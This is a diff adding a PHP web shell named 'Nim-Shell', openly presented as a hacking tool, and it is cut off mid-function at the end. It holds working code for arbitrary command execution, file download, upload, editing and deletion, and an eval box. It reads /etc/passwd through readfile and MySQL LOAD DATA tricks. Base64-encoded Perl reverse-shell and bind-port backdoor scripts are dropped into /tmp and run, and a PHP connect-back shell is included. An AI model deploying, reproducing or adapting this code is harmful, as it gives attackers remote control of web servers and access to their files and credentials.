@@ -1,0 +1,645 @@
+ <html><head> <!-- Coded by ZAC003    Default Password : yusefzadh   -->
+ <title>..:: Nim-Shell ::..</title>
+ <style type="text/css"> 
+ <!--  body { 	
+ scrollbar-face-color: #000000;  
+ font-size: 10px; 
+ scrollbar-highlight-color: #008000;   
+ scrollbar-shadow-color: #008000;  	
+ scrollbar-3dlight-color: #000000; 
+ scrollbar-arrow-color: #000000;  
+ scrollbar-track-color: #000000;  
+ font-family: verdana;  
+ scrollbar-darkshadow-color: #000000; 
+ }  input {
+ border-top-width: 1px; 
+ font-weight: bold;  
+ border-left-width: 1px; 
+ font-size: 10px; 
+ border-left-color: #008000; 
+ background: #004000;  
+ border-bottom-width: 1px;  	
+ border-bottom-color: #008000;  
+ color: #00ff00;  
+ border-top-color: #008000; 
+ font-family: verdana;  
+ border-right-width: 1px;  
+ border-right-color: #008000;
+ } textarea { 
+ border-top-width: 1px;
+ font-weight: bold;  	
+ border-left-width: 1px;
+ font-size: 10px;  
+ border-left-color: #008000; 
+ background: #004000;  
+ border-bottom-width: 1px;  
+ border-bottom-color: #008000;  
+ color: #00ff00; 
+ border-top-color: #008000;  
+ font-family: verdana;  
+ border-right-width: 1px;  
+ border-right-color: #008000;  
+ } .submit {
+ border-top-width: 1px; 
+ font-weight: bold;   
+ border-left-width: 1px;   
+ font-size: 10px; 
+ border-left-color: #008000;  
+ background: #004000;   	
+ border-bottom-width: 1px;   
+ border-bottom-color: #008000;   
+ color: #00ff00;   
+ border-top-color: #008000;  
+ font-family: verdana;   
+ border-right-width: 1px;   
+ border-right-color: #008000;
+ }a:link { 	
+ text-decoration: none; 
+ } a:visited { 
+ text-decoration: none; 
+ } a:active { 
+ text-decoration: none; }  a:hover { 	color: #00ff00;  	text-decoration: none; } .t_footer { color: #00cc00; font: bold 15px tahoma;  background: #303030;  border-style:solid;  border: thin solid #008000; padding: 5px; overflow: auto; } --> 
+ </style></head>
+ <body alink="#00ff00" bgcolor="#000000" link="#00c000" text="#008000" vlink="#00c000">
+
+
+<?php
+if(!empty($_GET['download']))
+{
+	//download Files  Code
+	$fdownload=$_GET['download'];
+	// path & file name
+	$path_parts = @pathinfo("$fdownload");
+	$entrypath=$path_parts["basename"];
+	$name = "$fdownload";
+	//$fp = @fopen($fdownload, 'rb');
+	header("Content-Disposition: attachment; filename=$entrypath");
+	header("Content-Length: " . filesize($name));
+	@readfile($fdownload);		
+	exit();
+}
+
+function getuser() 
+{
+	$out = get_current_user();    
+	if($out!="SYSTEM"){
+		$out = "uid=".getmyuid()."(".get_current_user().") gid=".getmygid();
+	} 
+return $out;
+}
+function testwget(){ 
+if(ex('wget --help')){return "<font size=2 color=#29a329>ON</font>";}else{return "<font size=2 color=#ff4500>OFF</font>";} 
+}function oracle(){ 
+if(function_exists('ocilogon')){return "<font size=2 color=#29a329>ON</font>";}else{return "<font size=2 color=#ff4500>OFF</font>";} 
+}function postgresql(){ 
+if(function_exists('pg_connect')){return "<font size=2 color=#29a329>ON</font>";}else{return "<font size=2 color=#ff4500>OFF</font>";} 
+}function testmssql(){if(function_exists('mssql_connect')){return "<font size=2 color=#29a329>ON</font>";}else{return "<font size=2 color=#ff4500>OFF</font>";} 
+}function testcurl(){ 
+if(function_exists('curl_version')){return "<font size=2 color=#29a329>ON</font>";}else{return "<font size=2 color=#ff4500>OFF</font>";} 
+}function testmysql(){ 
+if(function_exists('mysql_connect')){return "<font size=2 color=#29a329>ON</font>";}else{return "<font size=2 color=#ff4500>OFF</font>";} 
+}
+function view_size($size){ 
+if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";} 
+elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";} 
+elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";} 
+else {$size = $size . " B";} 
+return $size;} 
+ 
+ $self = $_SERVER['PHP_SELF'];
+ $docr = $_SERVER['DOCUMENT_ROOT'];
+ $sern = $_SERVER['SERVER_NAME']; 
+ $yourip = $_SERVER['REMOTE_ADDR'];
+ @ set_time_limit(0);
+
+	$name = 'Nim-Shell';
+	
+	$text =  'Server : '.$self.' , Victim IP : '.$yourip;		
+	$from_A = "From: $name \r\n";
+	@ mail($email,$subject,$text,$from_A);  
+	
+ if (!empty($_GET['ac']) && $_GET['ac'] =='phpinfo')
+ {
+	echo '<p align="center"><a href="'.$self.'"><font size="2" color="#800000">[ BACK ]</font></a></p><br><br>';
+	exit(phpinfo());
+ }
+  if (!empty($_GET['ac']) && $_GET['ac'] =='logout')
+ {
+	exit(session_destroy());
+ }
+?>
+ <div align="center" class="t_footer"> 
+ <center>
+ <table border="0" cellspacing="0" cellpadding="0" width="824" height="1">  
+ <tr>     
+ <td width="128" height="1" valign="top">  
+ <p align="center"><font color="#FFFF00"><b><i>Nim-Shell</i></b></font></td>
+ <td width="696" height="1" valign="top">    
+ <p align="center"><font size="2">[ <a href="<?php echo $self; ?>?ac=shell"> Shell</a> ]-[ <a href="<?php echo $self; ?>?ac=fm"> File Manager</a> ]-[ <a href="<?php echo $self; ?>?ac=upload"> Upload</a> ]-[        <a href="<?php echo $self; ?>?ac=tools"> Tools</a> ]-[ <a href="<?php echo $self; ?>?ac=cb">Bind/CB</a> ]-[ <a href="<?php echo $self; ?>?ac=phpinfo">PHP Info</a> ]-[ <a href="<?php echo $self; ?>?ac=bypass">Bypass</a> ]-[ <a href="<?php echo $self; ?>?ac=email">Email Sender</a> ]-[ <a href="<?php echo $self; ?>?ac=about">About</a> ]-[ <a href="<?php echo $self; ?>?ac=logout">Logout</a> ]</font></td>    </tr>   
+ <tr> <td width="126" height="1" valign="top">  
+ <p align="right"><font size="2">
+ &nbsp;OS&nbsp;:<br>
+ &nbsp;Server&nbsp;:<br>
+ &nbsp;Disable_Function&nbsp;:<br>
+ &nbsp;Safe_Mode&nbsp;:<br>
+ &nbsp;Shell Path&nbsp;:<br>
+ &nbsp;Server&nbsp;:<br>
+ &nbsp;Your IP&nbsp;:
+ </font></p>
+ </td><td width="698" height="1" valign="top"> 
+ <font size="2" color="#669999">
+ &nbsp;<?php echo @PHP_UNAME();?><br>
+ &nbsp;<?php echo $_SERVER["SERVER_SOFTWARE"]; ?><br>
+ &nbsp;<?php echo @ini_get("disable_functions"); ?><br>
+ &nbsp;<?php 
+			if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) =="on")
+			{
+				$safemode = true;	
+				$info = "<font color=\"red\">ON (secure)</font>";
+				echo $info; 
+			}else{
+				$safemode = false; 
+				$info = "<font color=\"green\">OFF (not secure)</font>"; 
+				echo $info; }?><br>
+				&nbsp;<?php echo $docr; ?><br>
+				&nbsp;<?php echo $_SERVER['REMOTE_ADDR']; echo ' ::: '; echo @getuser(); ?> ::: Total space : <?php echo view_size(disk_total_space(getcwd()));?> ::: Free space: <?php echo view_size(diskfreespace(getcwd()));?>
+				<br>
+				 &nbsp;<?php echo $_SERVER['SERVER_ADDR']; ?>		
+				</font></td></tr>
+<tr><td width="126" height="1" valign="top"><p align="right">
+<font size="2"><?php echo '$'.$sern; ?>&nbsp;:</font></td>
+<td width="698" height="1" valign="top">
+<form method="POST" action='<?php echo $self; ?>?ac=shell'>
+<font size="2"><input type="text" name="cmd" size="54">&nbsp;&nbsp; <input type="submit" value="eXeCuTe" name="B1"></font></form></tr>
+<tr><td width="824" height="1" valign="top" colspan="2">
+<hr color="#669999" size="0"></td></tr>
+<tr><td width="822" height="16" valign="top" colspan="2">
+<p align="center"><font size="2">
+<?php 
+if (!empty($_GET['ac']))
+{ 
+switch($_GET['ac'])
+{
+	case 'bypass':
+		if (!empty($_POST['readfile'])) 
+		{ 		
+			echo '<textarea rows="12" name="S1" cols="123">'; 
+			$df = ini_get("disable_functions");
+			if (!substr_count($df, 'readfile')){
+				 if(@readfile($bypass)){ 
+				 echo readfile($bypass);
+				 //  ELSE ! ;)
+				 }else{echo 'Access Denied';}				 
+			}else{
+				echo 'Sorry ! Disable Function';
+			}
+			echo '</textarea>';
+		}elseif(!empty($_POST['dblocation']) && !empty($_POST['dbusername']) && !empty($_POST['dbname']) ){
+			
+			$file = $_POST['dblocation'];
+			$dbname = $_POST['dbname'];
+			$dbuser = $_POST['dbusername'];
+			$dbpass = '';
+			@ $dbpass = $_POST['password'];
+			$location = 'localhost';
+			@ $db = new mysqli ($location,$dbuser,$dbpass,$dbname);
+			if (mysqli_connect_errno())
+			{
+				echo 'Error Connect To DataBase';
+			}
+			$query = "DROP TABLE $dbname.`bypass`" ;
+				 @ $result = $db->query($query);
+			$query = "CREATE TABLE $dbname.`bypass` (`readfile` VARCHAR( 2048 ) NOT NULL);";
+				 @ $result = $db->query($query);
+			$query = "LOAD DATA LOCAL INFILE '$file' INTO TABLE $dbname.bypass";
+				 @ $result = $db->query($query);
+			$query = "select * from bypass";
+				 @ $result = $db->query($query);
+			$num_result = $result->num_rows;
+			echo '<textarea rows="12" name="S1" cols="123">'; 
+			for ($i=0 ; $i < $num_result ; $i++)
+			{
+				$row_group = $result->fetch_assoc();
+				$fileecho =  $row_group['readfile'];
+				echo htmlspecialchars($fileecho);
+			}
+			echo '</textarea>';
+		}elseif(!empty($_POST['eval'])){
+			$commmandeval = $_POST['eval'];
+			eval("$commmandeval");
+		}else{
+		echo '
+<center>
+<div align="center">
+  <center>
+  <table border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td width="179" height="1" valign="top" align="center">
+        <p align="center"><font size="2" color="#33CCFF">Readfile()</font></td>
+      <td width="146" height="1" valign="top" align="center">
+        <p align="center"><font size="2" color="#33CCFF">SQL</font></td>
+      <td width="268" height="1" valign="top" align="center">
+        <p align="center"><font size="2" color="#33CCFF">Eval</font></td>
+    </tr>
+    <tr>
+      <td width="179" height="1" valign="top" align="center">
+        <form method="POST" action="'.$self.'?ac=bypass">
+          <p align="center"><font size="2">File Name <input type="text" name="readfile" size="20" value="/etc/passwd"><br><input type="submit" value="Bypass" name="B1"></font></p>
+        </form>
+      </td>
+      <td width="146" height="1" valign="top" align="center">
+        <form method="POST" action="'.$self.'?ac=bypass">
+          <p align="center"><font size="2">File Name :<input type="text" name="dblocation" size="20" value="/etc/passwd"><br>UserName
+          :<input type="text" name="dbusername" size="20"><br>Password :<input type="password" name="dbpassword" size="20"><br>DB
+          Name :<input type="text" name="dbname" size="20"><br><input type="submit" value="Bypass" name="B1"></font></p>
+        </form>
+      </td>
+      <td width="268" height="1" valign="top" align="center">
+        <form method="POST" action="'.$self.'?ac=bypass">
+          <p align="center"><font size="2">F.ex : echo \'ZAC003\';<textarea rows="6" name="eval" cols="30"></textarea></font></p>
+          <p align="center"><font size="2"><input type="submit" value="Bypass" name="B1"></font></p>
+        </form>
+      </td>
+    </tr>
+  </table>
+  </center>
+</div>
+</center>';	
+		}
+		
+	break;	
+	case 'email':
+		if (!empty($_POST['yname']) && !empty($_POST['yemail']) && !empty($_POST['to']) && !empty($_POST['subject']) && !empty($_POST['text'])) 
+		{
+		$name = $_POST['yname'];
+		$email = $_POST['yemail'] ;
+		$to = $_POST['to'];
+		$subject = $_POST['subject'];
+		$text =  nl2br($_POST['text']);		
+		$from_A = "From: $name \r\n";
+		if (@ mail($email,$subject,$text,$from_A))
+			{
+				echo 'Email Send ...';
+			}else{ echo 'Email not Send ...'; }
+			
+		}			echo '<center><form method="POST" action="'.$self.'?ac=email">
+		  <table border="0" width="457" cellspacing="0" cellpadding="0">
+		    <tr>
+		      <td width="95" height="18" align="right"><font size="2"><b>&nbsp;Your Name :</b></font></td>
+		      <td width="385" height="18">
+		          <input type="text" name="yname" size="20">
+		      </td>
+		    </tr>
+		    <tr>
+		      <td width="95" height="18" align="right"><font size="2"><b>&nbsp;Your Email :</b></font></td>
+		      <td width="385" height="18"><input type="text" name="yemail" size="20"></td>
+		    </tr>
+		    <tr>
+		      <td width="95" height="18" align="right"><font size="2"><b>&nbsp;To :</b></font></td>
+		      <td width="385" height="18"><input type="text" name="to" size="20"></td>
+		    </tr>
+		    <tr>
+		      <td width="95" height="18" align="right"><font size="2"><b>&nbsp;Subject :</b></font></td>
+		      <td width="385" height="18"><input type="text" name="subject" size="20"></td>
+		    </tr>
+		    <tr>
+		      <td width="95" height="18" valign="top" align="right"><font size="2"><b>Text :</b></font></td>
+		      <td width="385" height="18" valign="top"><textarea rows="4" name="text" cols="36"></textarea></td>
+		    </tr>
+		    <tr>
+		      <td width="482" height="18" colspan="2">
+		        <p align="center"><input type="submit" value="Send" name="B1"></td>
+		    </tr>
+		  </table></form></center>';
+	
+	break;
+	case 'shell':
+		if (!empty($_POST['cmd'])) 
+		{ 
+			$command = $_POST['cmd'];
+			echo '<textarea rows="12" name="S1" cols="123">'; 
+			$df = ini_get("disable_functions");
+			if (!substr_count($df, 'passthru')){
+				passthru($command); 
+			}elseif (!substr_count($df, 'system')){
+				system($command); 
+			}elseif (!substr_count($df, 'shell_exec')){ 
+				$shellcmd = shell_exec($command); 
+				echo $shellcmd; 
+			}else{
+				$current_dir = $docr ;
+				echo "sorry , Can't be ExEcUtEd ... Safe DIR :  ".dirname($current_dir).'
+'; 
+				$dir = opendir($current_dir);
+				while($file=readdir($dir)){
+					echo $file.'
+';
+				}
+			} 	
+			echo '</textarea>'; 
+		} 
+	break; 
+	case 'upload':
+		echo "
+		<table>
+			<form enctype=\"multipart/form-data\" action=\"$self?ac=upload\" method=\"POST\">
+			<input type=\"hidden\" name=\"ac\" value=\"upload\">
+			<tr><td>File:
+			</td><td>
+			<input size=\"48\" name=\"file\" type=\"file\">
+			</td></tr>
+			<tr><td>Addres:
+			</td><td>
+			<input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\">
+			<input type=\"submit\" value=\"Go\"><font size='1'> IS Copy() !</font>
+			</td>
+		</table>
+		<br></form >"; 
+		echo "
+		<table>
+			<form  action=\"$self?ac=upload\" method=\"POST\"><input type=\"hidden\" name=\"ac\" value=\"copy\">
+			<tr><td>URL:
+			</td><td>
+			<input size=\"48\" name=\"file\" type=\"text\">
+			</td></tr>
+			<tr><td>Addres:
+			</td><td><input size=\"48\" value=\"$docr/[File Name,Shell.php]\" name=\"path\" type=\"text\">
+			<input type=\"submit\" value=\"Go\"><font size='1'> IS Copy() !</font></td>
+		</table></form >"; 
+		if (isset($_POST['path'])){
+			if ($_POST['ac'] == 'upload') {
+				$uploadfile = $_POST['path'].$_FILES['file']['name'];
+				if ($_POST['path']==""){
+					$uploadfile = $_FILES['file']['name']; 
+				} if (@copy($_FILES['file']['tmp_name'], $uploadfile)){  
+				echo " upload $uploadfile<br>";
+				echo "File" .$_FILES['file']['name']. "<br>"; 
+				echo "Size:" .$_FILES['file']['size']. "<br>"; 
+				} else {  
+				print "please select File:<br>"; 
+				print_r($_FILES); 
+				} }elseif($_POST['ac'] == 'copy'){ 
+					$remotefile = $_POST['file'];
+					$filetype = $_POST['path']; 
+					if (copy($remotefile,$filetype)) 
+					{ 
+					print "Complete Copy File ($filetype) !<br>";
+					}}}
+	break; 
+	case 'tools':
+		echo 'The Best Webbase Hackning Tools : <font size="2"><a href="http://zac003.a20.ir"> Here </a>'; 
+	break; 
+	case 'cb':
+		if (!empty($_POST['ipphp']) && !empty($_POST['portphp'])){ 
+			$ip=$_POST['ipphp']; 
+			$port=$_POST['portphp']; 
+			
+				@$fp=fsockopen($ip , $port , $errno, $errstr);
+				if (!$fp){
+					$result = "Error: Could not open socket connection";
+				}else{
+					$server =  $_SERVER["SERVER_SOFTWARE"];
+					$uname = PHP_UNAME(); 
+					$mass ="		!..:: NIM-Shell ::..!\n-----------------------------------------------------------\nUname : $uname\nServer : $server\nVirangar UnderGround Team , Aria Security Team , WhiteHat Nomads Group , Pares Security Team\nAnd All Iranian Young Hacker ;)\n-----------------------------------------------------------\n";
+					@ fputs ($fp ,"$mass");
+					while(!feof($fp)){
+						@ fputs ($fp," Shell->$ ");
+						$result= fgets ($fp, 4096);
+						$message = $result;	$df = ini_get("disable_functions");
+						if (!substr_count($df, 'shell_exec')){
+							$message = shell_exec($message); 
+							@ fputs ($fp,"-----------------------------------------------------------\n".$message."\n-----------------------------------------------------------\n");
+						}else{ 
+							echo "sorry , Can't be executed For Connect Back"; 	
+						} } 
+						fclose ($fp); 
+					}}elseif(!empty($_POST['ipperl']) && !empty($_POST['portperl'])){
+						$ip=$_POST['ipperl']; 
+						$port=$_POST['portperl']; 
+						$cbperl_win = base64_decode("dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtCT0gJ2NtZC5leGUnOw0KJEFSR0M9QEFSR1Y7IA0KaWYgKCRBUkdDIT0yKSB7IA0KICAgcHJpbnQgIlVzYWdlOiBjYi5wbCBbSG9zdF0gW1BvcnRdIFxuIjsgDQogICBkaWUgIkYuZXg6IGNiLnBsICAxMjcuMC4wLjEgMTM3MCBcbiI7IA0KfSANCnVzZSBTb2NrZXQ7IA0KdXNlIEZpbGVIYW5kbGU7IA0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCd0Y3AnKSkgb3IgZGllIHByaW50ICJbLV0gQ291bGQgTm90IENvbnZlcnQgSG9zdCBOYW1lXG4iOyANCmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkQVJHVlsxXSwgaW5ldF9hdG9uKCRBUkdWWzBdKSkpIG9yIGRpZSBwcmludCAiWy1dIENvdWxkIE5vdCBDMG5uM2N0IDIgSG9zdFxuIjsgDQpwcmludCAiWytdIFJlc2xvdmluZyBIb3N0IDxicj4iOyANCnByaW50ICJbK10gQ29ubmVjdGluZy4uLiAkQVJHVlswXSA8YnI+IjsgDQpwcmludCAiWytdIENvbm5lY3RlZCB0byByZW1vdGUgaG9zdCA8YnI+IjsNCnByaW50ICJbK10gU3dhcHBpbmcgU2hlbGwgPGJyPiI7DQpwcmludCAiWytdIFlvdXIgR2V0IEFjY2VzcyA8YnI+IjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7IA0Kb3BlbihTVERJTiwgIj4mU09DS0VUIik7IA0Kb3BlbihTVERPVVQsIj4mU09DS0VUIik7IA0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7IA0KcHJpbnQgIlxuXG4gIAkJIS4uOjogTklNLVNoZWxsIDo6Li4hXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuVmlyYW5nYXIgVW5kZXJHcm91bmQgVGVhbSAsIEFyaWEgU2VjdXJpdHkgVGVhbSAsIFdoaXRlSGF0IE5vbWFkcyBHcm91cCAsIFBhcmVzIFNlY3VyaXR5IFRlYW1cbkFuZCBBbGwgSXJhbmlhbiBZb3VuZyBIYWNrZXIgOylcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4iOzsgDQpzeXN0ZW0oJHN5c3RlbSk7");
+						$cbperl_linux = base64_decode("dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtCT0gJy9iaW4vc2gnOw0KJEFSR0M9QEFSR1Y7IA0KaWYgKCRBUkdDIT0yKSB7IA0KICAgcHJpbnQgIlVzYWdlOiBjYi5wbCBbSG9zdF0gW1BvcnRdIFxuIjsgDQogICBkaWUgIkYuZXg6IGNiLnBsICAxMjcuMC4wLjEgMTM3MCBcbiI7IA0KfSANCnVzZSBTb2NrZXQ7IA0KdXNlIEZpbGVIYW5kbGU7IA0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCd0Y3AnKSkgb3IgZGllIHByaW50ICJbLV0gQ291bGQgTm90IENvbnZlcnQgSG9zdCBOYW1lXG4iOyANCmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkQVJHVlsxXSwgaW5ldF9hdG9uKCRBUkdWWzBdKSkpIG9yIGRpZSBwcmludCAiWy1dIENvdWxkIE5vdCBDMG5uM2N0IDIgSG9zdFxuIjsgDQpwcmludCAiWytdIFJlc2xvdmluZyBIb3N0IDxicj4iOyANCnByaW50ICJbK10gQ29ubmVjdGluZy4uLiAkQVJHVlswXSA8YnI+IjsgDQpwcmludCAiWytdIENvbm5lY3RlZCB0byByZW1vdGUgaG9zdCA8YnI+IjsNCnByaW50ICJbK10gU3dhcHBpbmcgU2hlbGwgPGJyPiI7DQpwcmludCAiWytdIFlvdXIgR2V0IEFjY2VzcyA8YnI+IjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7IA0Kb3BlbihTVERJTiwgIj4mU09DS0VUIik7IA0Kb3BlbihTVERPVVQsIj4mU09DS0VUIik7IA0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7IA0KcHJpbnQgIlxuXG4gIAkJIS4uOjogTklNLVNoZWxsIDo6Li4hXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuVmlyYW5nYXIgVW5kZXJHcm91bmQgVGVhbSAsIEFyaWEgU2VjdXJpdHkgVGVhbSAsIFdoaXRlSGF0IE5vbWFkcyBHcm91cCAsIFBhcmVzIFNlY3VyaXR5IFRlYW1cbkFuZCBBbGwgSXJhbmlhbiBZb3VuZyBIYWNrZXIgOylcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4iOzsgDQpzeXN0ZW0oJHN5c3RlbSk7");
+						@ $fp = fopen("/tmp/sess_nim-shell.sess","w+");
+						@ fwrite($fp,$cbperl_linux,strlen($cbperl_linux));
+						@ fclose($fp);
+						$command = ("perl /tmp/sess_nim-shell.sess $ip $port");
+						$df = ini_get("disable_functions");
+						if (!substr_count($df, 'passthru')){
+							passthru($command); 
+						}elseif (!substr_count($df, 'system')){
+							system($command); 
+						}elseif (!substr_count($df, 'shell_exec')){ 
+							$shellcmd = shell_exec($command); 
+							echo $shellcmd; 
+						}else{
+							echo "sorry , Can't be ExEcUtEd ";
+						}
+					}elseif(!empty($_POST['portbackdoor']) ){
+						$port=$_POST['portbackdoor']; 
+						$cbperl_win = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokcG9ydCA9IDEzNzA7DQokcG9ydCA9ICRBUkdWWzBdIGlmICRBUkdWWzBdOw0KZXhpdCBpZiBmb3JrOw0KJDAgPSAidXBkYXRlZGIiIC4gIiAiIHgxMDA7DQokU0lHe0NITER9ID0gJ0lHTk9SRSc7DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAwKTsNCnNldHNvY2tvcHQoUywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAxKTsNCmJpbmQoUywgc29ja2FkZHJfaW4oJHBvcnQsIElOQUREUl9BTlkpKTsNCmxpc3RlbihTLCA1MCk7DQp3aGlsZSgxKQ0Kew0KCWFjY2VwdChYLCBTKTsNCgl1bmxlc3MoZm9yaykNCgl7DQoJCW9wZW4gU1RESU4sICI8JlgiOw0KCQlvcGVuIFNURE9VVCwgIj4mWCI7DQoJCW9wZW4gU1RERVJSLCAiPiZYIjsNCgkJY2xvc2UgWDsNCgkJZXhlYygiY21kLmV4ZSIpOw0KCX0NCgljbG9zZSBYOw0KfQ0KcHJpbnQgIio9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Kjxicj4iOw0KcHJpbnQgIiogICAgICAgIC06IFpBQzAwMyBCaW5kIFBvcnQgOi0gICAgICAgICAgKjxicj4iOw0KcHJpbnQgIiogICBHcmVldHMgOiBBbGwgSXJhbmlhbiBIYWNrZXJzICAgICAgICAgKjxicj4iOw0KcHJpbnQgIiogICAgU3A0d05pbkcgU2hlTEwgMGYgcE9yVCA6IDEzNzAgICAgICAgKjxicj4iOw0KcHJpbnQgIio9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Kjxicj4iOw==");
+						$cbperl_linux = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokcG9ydCA9IDEzNzA7DQokcG9ydCA9ICRBUkdWWzBdIGlmICRBUkdWWzBdOw0KZXhpdCBpZiBmb3JrOw0KJDAgPSAidXBkYXRlZGIiIC4gIiAiIHgxMDA7DQokU0lHe0NITER9ID0gJ0lHTk9SRSc7DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAwKTsNCnNldHNvY2tvcHQoUywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAxKTsNCmJpbmQoUywgc29ja2FkZHJfaW4oJHBvcnQsIElOQUREUl9BTlkpKTsNCmxpc3RlbihTLCA1MCk7DQp3aGlsZSgxKQ0Kew0KCWFjY2VwdChYLCBTKTsNCgl1bmxlc3MoZm9yaykNCgl7DQoJCW9wZW4gU1RESU4sICI8JlgiOw0KCQlvcGVuIFNURE9VVCwgIj4mWCI7DQoJCW9wZW4gU1RERVJSLCAiPiZYIjsNCgkJY2xvc2UgWDsNCgkJZXhlYygiL2Jpbi9zaCIpOw0KCX0NCgljbG9zZSBYOw0KfQ0KcHJpbnQgIio9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Kjxicj4iOw0KcHJpbnQgIiogICAgICAgIC06IFpBQzAwMyBCaW5kIFBvcnQgOi0gICAgICAgICAgKjxicj4iOw0KcHJpbnQgIiogICBHcmVldHMgOiBBbGwgSXJhbmlhbiBIYWNrZXJzICAgICAgICAgKjxicj4iOw0KcHJpbnQgIiogICAgU3A0d05pbkcgU2hlTEwgMGYgcE9yVCA6IDEzNzAgICAgICAgKjxicj4iOw0KcHJpbnQgIio9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Kjxicj4iOw==");
+						@ $fp = fopen("/tmp/sess_nim-shell-bd.sess","w+");
+						@ fwrite($fp,$cbperl_linux,strlen($cbperl_linux));
+						@ fclose($fp);
+						$command = ("perl /tmp/sess_nim-shell-bd.sess $port");
+						$df = ini_get("disable_functions");
+						if (!substr_count($df, 'passthru')){
+							passthru($command); 
+						}elseif (!substr_count($df, 'system')){
+							system($command); 
+						}elseif (!substr_count($df, 'shell_exec')){ 
+							$shellcmd = shell_exec($command); 
+							echo $shellcmd; 
+						}else{
+							echo "sorry , Can't be ExEcUtEd ";
+						}
+					}else{
+					?>
+					
+<p align="center">With PHP(Only PHP Function) :
+<form method="POST" action="<?php echo $self; ?>?ac=cb">
+					<div align="center">
+					<table border="0" cellspacing="0" cellpadding="0" height="1" width="464">
+					<tr><td width="39" height="1"><p align="right">&nbsp;IP :</p></td>
+					<center><td width="148" height="1"><input type="text" name="ipphp" size="26" value="<?php echo $yourip; ?>">
+					</td></center><td width="71" height="1"><p align="right">Port :</td><center><td width="88" height="1"><input type="text" name="portphp" size="13" value="1370"></td><td width="106" height="1">&nbsp;&nbsp;&nbsp;<input type="submit" value="Connect" name="B1"></td></tr></table></center></div></form>
+<p align="center">With Perl (Very GOOD For ROOT) :</p>
+<form method="POST" action="<?php echo $self; ?>?ac=cb">
+<div align="center">  <center>  <table border="0" cellspacing="0" cellpadding="0" width="454">    <tr>      <td width="36" height="1" align="right">IP :</td>      <td width="192" height="1" align="right"><input type="text" name="ipperl" size="26" value="<?php echo $yourip; ?>">
+      </td>      <td width="61" height="1" align="right">Port :</td><td width="101" height="1" align="right"><input type="text" name="portperl" size="13" value="1370"></td>      <td width="86" height="1" align="right"><input type="submit" value="Connect" name="B1"></td>    </tr>  </table>  </center></div></form>
+<p align="center">BackDoor With Perl :</p>
+<form method="POST" action="<?php echo $self; ?>?ac=cb">
+<div align="center">  <table border="0" cellspacing="0" cellpadding="0" width="228">    <tr>      <td width="306" height="1" align="right">        <p align="right">Port :</td>      <center>      <td width="210" height="1" align="right"><input type="text" name="portbackdoor" size="13" value="1370"></td>      <td width="75" height="1" align="right">  <input type="submit" value="BinD" name="B1"></td>      </tr>    </table>  </center></div></form>
+
+<?php  }break;
+			case 'fm':
+			if(!empty($_GET['edit']))
+			{
+				$filefedit = $_GET['edit'];
+				if(!empty($_POST['file']) && !empty($_POST['dir']))
+				{
+					$filefedit = $_POST['dir'];
+					$fileed = $_POST['file'];
+					$file = $_GET['edit'];
+					@ $fp = fopen($filefedit,"w+");
+					if(!$fp)
+					{
+						echo 'Error Read File  For Edit ....';
+					}else{
+						if(fwrite($fp,$fileed,strlen($fileed)))
+						{
+							echo 'File Save in => '.$_POST['dir'];
+						}else{
+							echo 'Connot Write In File ...';
+						}				
+					}					
+				}
+				
+				echo '<form method="POST" action="'.$self.'?ac=fm&edit='.$filefedit.'">
+			          <center>
+			  <table border="0" cellspacing="0" cellpadding="0" width="200">
+			    <tr>
+			      <td width="696" height="1" valign="top">
+			          <p align="center"><textarea rows="18" name="file" cols="84">';
+		  
+				$file = $filefedit;
+				@ $fp = fopen($file,'rb');
+				if(!$fp)
+				{
+					echo 'Error Read File ....';
+				}else{
+					while(!feof($fp))
+					{
+						echo htmlspecialchars(fgets($fp,999));				
+					}
+					fclose($fp);
+				}
+				echo '</textarea></p>   </td>   </tr>   <tr><td width="696" height="1">Save File :&nbsp; <input type="text" name="dir" value="'.$file.'" size="50">&nbsp;&nbsp;
+				        <input type="submit" value="SaVe" name="B1"></td></tr> </table> </center></div> </form>';
+			exit();
+			}
+			if(!empty($_GET['delete']))
+			{
+				$frpath=$_GET['delete'];
+				if (@is_dir($frpath)){
+					$matches = glob($frpath . '/*.*');
+					if (@is_array ( $matches ) ) {
+							foreach ( $matches as $filename) {
